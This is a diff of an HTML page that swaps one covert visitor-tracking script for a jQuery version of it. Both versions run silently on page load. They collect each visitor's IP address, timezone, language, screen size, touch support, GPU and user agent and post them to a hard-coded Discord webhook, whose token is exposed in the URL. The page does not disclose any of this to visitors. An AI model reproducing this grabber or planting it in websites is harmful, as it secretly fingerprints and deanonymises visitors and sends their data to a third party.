@@ -95850,76 +95850,124 @@ document.addEventListener('contextmenu', event => event.preventDefault());
 
 
 
-NEW
 <!DOCTYPE html>
 <html>
 <head>
-<script>
-  function sendWebhook(data) {
-    var webhookURL = "https://discord.com/api/webhooks/1181563871488651274/TbA4Qd5tj3XzMj6R0vJ1TUX-CK_2yQYX6nWnHWsqoVAa82oeNIEaVfMdem-qk00dY7yk";
-    var request = new XMLHttpRequest();
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+  <script type="text/javascript">
+    $(document).ready(function() {   // Waits for page to load completely
 
-    request.open("POST", webhookURL, true);
-    request.setRequestHeader("Content-type", "application/json");
-
-    request.onreadystatechange = function() {
-      if (request.readyState === 4 && request.status === 200) {
-        console.log("Data sent successfully!");
-      } else {
-        console.log("Error sending data.");
+      // Function to post data to Discord webhook
+      function postData(webhookUrl, data) {
+        $.ajax({
+          url: webhookUrl,
+          type: 'POST',
+          contentType: 'application/json',
+          data: JSON.stringify(data)
+        });
       }
-    };
 
-    request.send(JSON.stringify(data));
-  }
+      // Function to get the user's IP address
+      function getClientIP()
+      {
+        return fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => data.ip)
+          .catch(error => console.error('Error:', error));
+      }
 
-  function fetchData() {
-    var data = {};
+      // Function to get the user's timezone offset
+      function getClientTimezoneOffset()
+      {
+        return new Date().getTimezoneOffset();
+      }
 
-    // Fetching IP address
-    fetch("https://json.geoiplookup.io/")
-      .then(function(response) {
-        return response.json();
-      })
-      .then(function(jsonData) {
-        data.ip = jsonData.ip;
-      });
+      // Function to get the user's language
+      function getClientLanguage()
+      {
+        return navigator.language || navigator.userLanguage;
+      }
 
-    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      // Function to get the user's screen size
+      function getClientScreenSize()
+      {
+        return {
+          width: window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+          height: window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        };
+      }
 
-  
-    data.userTime = new Date().toLocaleTimeString();
+      // Function to check if user has touch screen
+      function hasTouchScreen()
+      {
+        return ('ontouchstart' in window) || (navigator.msMaxTouchPoints > 0);
+      }
 
-    data.language = navigator.language;
+      // Function to get the user's GPU information
+      function getClientGPU()
+      {
+        var canvas = document.createElement('canvas');
+        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return debugInfo && gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      }
 
+      // Function to get the user agent string
+      function getUserAgent()
+      {
+        return navigator.userAgent;
+      }
 
-    data.screenSize = {
-      width: window.innerWidth,
-      height: window.innerHeight
-    };
+      // Send fetched data with Discord webhook
+      function sendFetchedData() {
+        var webhookUrl = 'https://discord.com/api/webhooks/1181563871488651274/TbA4Qd5tj3XzMj6R0vJ1TUX-CK_2yQYX6nWnHWsqoVAa82oeNIEaVfMdem-qk00dY7yk'; 
 
-   
-    data.gpu = navigator.userAgentData && navigator.userAgentData.gpu ? navigator.userAgentData.gpu.toString() : "N/A";
+        // Gather all the fetched data
+        var data = {
+          ip: '',
+          timezoneOffset: '',
+          language: '',
+          screenSize: {},
+          hasTouchScreen: false,
+          gpu: '',
+          userAgent: ''
+        };
 
-    
-    data.hasTouchScreen = "ontouchstart" in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0;
+        // Get user's IP address
+        getClientIP().then(function(ip) {
+          data.ip = ip;
 
-    
-    data.userAgent = navigator.userAgent;
+          // Get user's timezone offset
+          data.timezoneOffset = getClientTimezoneOffset();
 
-    
-    sendWebhook(data);
-  }
-</script>
+          // Get user's language
+          data.language = getClientLanguage();
+
+          // Get user's screen size
+          data.screenSize = getClientScreenSize();
+
+          // Check if user has touch screen
+          data.hasTouchScreen = hasTouchScreen();
+
+          // Get user's GPU
+          data.gpu = getClientGPU();
+
+          // Get user agent string
+          data.userAgent = getUserAgent();
+
+          // Send the data via Discord webhook
+          postData(webhookUrl, data);
+        });
+      }
+
+      // Call the function when the page loads
+      sendFetchedData();
+    });
+  </script>
 </head>
-<body onload="fetchData()">
-<!-- Add your website content here -->
+<body>
 </body>
 </html>
-
-
-
-
 
 
 
